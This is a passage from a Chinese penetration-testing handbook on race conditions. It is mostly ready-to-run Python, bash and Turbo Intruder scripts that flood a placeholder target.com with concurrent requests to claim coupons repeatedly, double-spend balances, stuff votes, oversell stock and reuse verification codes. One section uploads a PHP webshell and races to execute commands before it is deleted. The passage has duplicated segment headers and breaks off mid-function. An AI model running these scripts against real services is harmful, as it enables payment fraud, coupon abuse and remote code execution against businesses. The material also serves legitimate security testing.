# race-condition-test · part 1 · part 1

> 分段 1/2。索引见 `race-condition-test-p1.md`。

# race-condition-test · part 1

> 分段 1/3。完整索引见 `race-condition-test.md`。

## 一、原有知识库

# 竞态条件测试手册
## 一、竞态条件原理

### TOCTOU (Time-of-Check to Time-of-Use)

```
正常流程:
1. 检查条件（如余额是否充足）
2. 执行操作（扣款）

竞态条件:
线程A: 检查余额100 → 扣款50
线程B: 检查余额100 → 扣款50
结果: 余额应为0，实际可能为50或-50
```

对象存储配了「不存在则回源」、检测和真正下载拆开时：对同一 key 边 PUT 边 DELETE，可绕过「先看对象在不在」。见 `../../web-ssrf-render/knowledge/ssrf-test.md`「COS 回源竞态」。**见了回源再打**，不是每站必打。

---
## 二、高危场景识别

### 2.1 优惠券/红包领取

```python
# 一次性资源重复获取
# 场景: 优惠券限领1次，但并发请求可领多次

import requests
import threading

url = "https://target.com/api/coupon/claim"
headers = {"Authorization": "Bearer TOKEN"}
data = {"couponId": "NEWUSER100"}

def claim():
    r = requests.post(url, headers=headers, json=data)
    print(r.json())

# 并发50次
threads = [threading.Thread(target=claim) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]

# 检查账户是否领到多张优惠券
```

### 2.2 余额/积分消费（双花攻击）

```python
# 场景: 余额100，同时发起2笔100的消费

import asyncio
import aiohttp

async def consume(session):
    async with session.post(
        "https://target.com/api/pay",
        headers={"Authorization": "Bearer TOKEN"},
        json={"amount": 100}
    ) as resp:
        return await resp.json()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [consume(session) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(r)

asyncio.run(main())

# 检查: 是否成功消费超过余额的金额
```

### 2.3 投票/点赞（重复计数）

```bash
# 场景: 每人限投1票，但并发可投多票

for i in $(seq 1 20); do
  curl -X POST "https://target.com/api/vote" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"targetId": "123"}' &
done
wait

# 检查目标的票数是否增加超过1
```

### 2.4 文件上传后删除

```python
# 场景: 上传 webshell → 系统检测到恶意 → 删除
# 利用: 上传后立即并发访问，在删除前执行

import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>')}
    requests.post("https://target.com/upload", files=files)

def access():
    for _ in range(100):
        r = requests.get("https://target.com/uploads/shell.php?c=id")
        if r.status_code == 200:
            print("成功执行:", r.text)
            break

# 线程1上传，线程2疯狂访问
t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=access)
t1.start()
t2.start()
```

### 2.5 限量抢购（库存超卖）

```python
# 场景: 商品库存10，但100人同时下单

import requests
import threading

def buy():
    r = requests.post("https://target.com/api/order/create",
        headers={"Authorization": "Bearer TOKEN"},
        json={"goodsId": "LIMITED_ITEM", "count": 1})
    print(r.json())

threads = [threading.Thread(target=buy) for _ in range(100)]
[t.start() for t in threads]
[t.join() for t in threads]

# 检查: 是否有超过10个订单成功
```

### 2.6 验证码验证

```python
# 场景: 验证码验证后失效，但并发提交可绕过

import requests
import threading

code = "123456"  # 获取到的验证码

def submit():
    r = requests.post("https://target.com/api/verify",
        json={"phone": "13800138000", "code": code})
    print(r.json())

# 并发提交同一验证码
threads = [threading.Thread(target=submit) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

---
## 三、测试工具与方法

### 3.1 HTTP/2 单包攻击（Single Packet Attack）

**原理**: HTTP/2 多路复用允许在一个 TCP 包内发送多个请求，消除网络抖动，所有请求几乎同时到达服务器。

#### h2load 用法

```bash
# 安装 h2load (nghttp2)
# Ubuntu: apt install nghttp2-client
# macOS: brew install nghttp2

# 发送50个并发请求，使用1个连接，每个连接最多50个流
h2load -n 50 -c 1 -m 50 \
  -H "Authorization: Bearer TOKEN" \
  -d '{"couponId":"NEWUSER100"}' \
  -H "Content-Type: application/json" \
  https://target.com/api/coupon/claim

# 参数说明:
# -n: 总请求数
# -c: 并发连接数（设为1确保单包）
# -m: 每个连接的最大并发流数
# -d: POST 数据
# -H: 请求头
```

#### Python httpx 实现

```python
import httpx
import asyncio

async def single_packet_attack():
    """HTTP/2 单包攻击"""
    url = "https://target.com/api/coupon/claim"
    headers = {
        "Authorization": "Bearer TOKEN",
        "Content-Type": "application/json"
    }
    data = {"couponId": "NEWUSER100"}
    
    # 使用 HTTP/2
    async with httpx.AsyncClient(http2=True) as client:
        # 在同一连接上并发发送请求
        tasks = [
            client.post(url, headers=headers, json=data)
            for _ in range(50)
        ]
        responses = await asyncio.gather(*tasks)
        
        for i, resp in enumerate(responses):
            print(f"请求 {i+1}: {resp.status_code} - {resp.text}")

asyncio.run(single_packet_attack())
```

### 3.2 Turbo Intruder（Burp 插件）

```python
# Burp → Extender → BApp Store → Turbo Intruder

# 脚本示例（在 Turbo Intruder 中使用）
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=50,
                          pipeline=False)
    
    for i in range(50):
        engine.queue(target.req)
    
    engine.start()

def handleResponse(req, interesting):
    table.add(req)
```

### 3.3 Python asyncio + aiohttp

```python
import asyncio
import aiohttp
import time

async def race_condition_test(url, headers, data, count=50):
    """通用竞态条件测试"""
    
    async def send_request(session, index):
        start = time.time()
        async with session.post(url, headers=headers, json=data) as resp:
            elapsed = time.time() - start
            result = await resp.json()
            return {
                "index": index,
                "status": resp.status,
                "elapsed": elapsed,
                "result": result
            }
    
    # 创建连接池，复用连接
    connector = aiohttp.TCPConnector(limit=1, limit_per_host=1)
    async with aiohttp.ClientSession(connector=connector) as session:
        # 预热连接
        await session.post(url, headers=headers, json=data)
        
        # 并发发送
        tasks = [send_request(session, i) for i in range(count)]
        results = await asyncio.gather(*tasks)
        
        return results

# 使用示例
url = "https://target.com/api/coupon/claim"
headers = {"Authorization": "Bearer TOKEN"}
data = {"couponId": "NEWUSER100"}

results = asyncio.run(race_condition_test(url, headers, data, 50))

# 分析结果
success_count = sum(1 for r in results if r['status'] == 200)
print(f"成功请求数: {success_count}/50")

# 检查响应时间分布（越接近说明并发度越高）
times = [r['elapsed'] for r in results]
print(f"最快: {min(times):.3f}s, 最慢: {max(times):.3f}s, 平均: {sum(times)/len(times):.3f}s")
```

### 3.4 curl 并发

```bash
# 简单并发（网络抖动较大，效果较差）
for i in $(seq 1 50); do
  curl -X POST "https://target.com/api/coupon/claim" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"couponId":"NEWUSER100"}' &
done
wait

# 使用 GNU Parallel（更好的并发控制）
seq 1 50 | parallel -j 50 \
  'curl -X POST "https://target.com/api/coupon/claim" \
   -H "Authorization: Bearer TOKEN" \
   -H "Content-Type: application/json" \
   -d "{\"couponId\":\"NEWUSER100\"}"'
```

---
## 四、判断标准

### 如何确认竞态条件成功

#### 4.1 余额/积分变化

```python
# 测试前记录余额
before = get_balance()

# 执行竞态测试
race_condition_test(...)

# 测试后检查余额
after = get_balance()

# 判断
if before - after > expected_deduction:
    print("竞态条件成功: 扣款异常")
```

#### 4.2 重复记录

```sql
-- 检查数据库是否有重复记录
SELECT coupon_id, user_id, COUNT(*) as count
FROM user_coupons
WHERE user_id = 'TEST_USER'
GROUP BY coupon_id, user_id
HAVING count > 1;
```

#### 4.3 库存异常

```python
# 检查订单数是否超过库存
orders = get_orders(goods_id="LIMITED_ITEM")
stock = get_stock(goods_id="LIMITED_ITEM")

if len(orders) > stock:
    print(f"库存超卖: 库存{stock}，订单{len(orders)}")
```

#### 4.4 响应内容分析

```python
# 分析所有响应
results = race_condition_test(...)

success_responses = [r for r in results if r['status'] == 200]
print(f"成功响应数: {len(success_responses)}")

# 检查响应中的业务状态码
business_success = [r for r in success_responses 
                   if r['result'].get('code') == 0]
print(f"业务成功数: {len(business_success)}")

# 如果业务成功数 > 1（对于一次性资源）→ 竞态条件存在
```

---
## 五、WooYun 实战模式

### 5.1 支付场景

```python
# 案例: 余额100，同时发起2笔100的支付
# 期望: 第二笔失败
# 实际: 两笔都成功，余额变为-100

async def double_spend_attack():
    url = "https://target.com/api/pay"
    headers = {"Authorization": "Bearer TOKEN"}
    data = {"orderId": "ORDER123", "amount": 100}
    
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(url, headers=headers, json=data),
            session.post(url, headers=headers, json=data)
        ]
        results = await asyncio.gather(*tasks)
        
        for r in results:
            print(await r.json())
```

### 5.2 优惠券场景

```python
# 案例: 同一优惠券并发使用多次
# 期望: 只能使用1次
# 实际: 使用了10次

async def coupon_reuse_attack():
    url = "https://target.com/api/order/create"
    headers = {"Authorization": "Bearer TOKEN"}
    data = {
        "goodsId": "ITEM123",
        "couponId": "DISCOUNT50"  # 50元优惠券
    }
    
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, headers=headers, json=data) 
                for _ in range(10)]
        results = await asyncio.gather(*tasks)
        
        success = sum(1 for r in results if r.status == 200)
        print(f"成功使用优惠券 {success} 次")
```

### 5.3 签到/积分场景

```python
# 案例: 并发签到获得多倍积分
# 期望: 每日签到1次，获得10积分
# 实际: 并发签到20次，获得200积分

async def checkin_race():
